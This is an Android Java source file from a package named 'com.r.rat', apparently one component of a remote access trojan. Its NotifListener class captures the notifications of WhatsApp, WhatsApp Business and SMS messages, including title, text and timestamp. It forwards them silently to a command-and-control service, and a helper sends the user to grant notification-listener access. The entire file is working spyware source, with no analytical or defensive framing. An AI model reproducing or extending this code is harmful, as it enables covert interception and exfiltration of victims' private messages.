package com.r.rat;
import android.content.Context;
import android.content.Intent;
import android.provider.Settings;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import org.json.JSONObject;
public class NotifListener extends NotificationListenerService {
    @Override public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            String pkg = sbn.getPackageName();
            if (!pkg.equals("com.whatsapp") && !pkg.equals("com.whatsapp.w4b")
                    && !pkg.equals("com.android.mms")) return;
            JSONObject j = new JSONObject();
            j.put("pkg", pkg);
            j.put("title", String.valueOf(sbn.getNotification().extras.getCharSequence("android.title")));
            j.put("text", String.valueOf(sbn.getNotification().extras.getCharSequence("android.text")));
            j.put("time", sbn.getPostTime());
            C2Service.emit("notif", j);
        } catch (Exception ignored) {}
    }
    public static void enable(Context c) {
        if (!Settings.Secure.getString(c.getContentResolver(),
                "enabled_notification_listeners").contains(c.getPackageName())) {
            c.startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
        }
    }
}